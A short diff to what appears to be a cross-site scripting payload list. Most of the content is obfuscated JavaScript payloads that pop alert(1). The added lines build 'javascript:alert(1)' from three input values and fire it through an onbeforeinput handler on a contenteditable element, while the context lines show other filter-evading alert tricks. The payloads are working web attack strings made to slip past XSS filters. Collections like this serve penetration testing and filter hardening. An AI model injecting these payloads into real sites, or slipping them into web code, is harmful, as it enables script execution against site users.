@@ -7,4 +7,13 @@
 <script>top[8680439..toString(30)](1337)</script>
 
 ';k='e'%0Atop['al'+k+'rt'](1)//
+
+
+<input id=b value=javascrip>
+<input id=c value=t:aler>
+<input id=d value=t(1)>
+<lol 
+          contenteditable
+          onbeforeinput='location=b.value+c.value+d.value'>
+
 ```
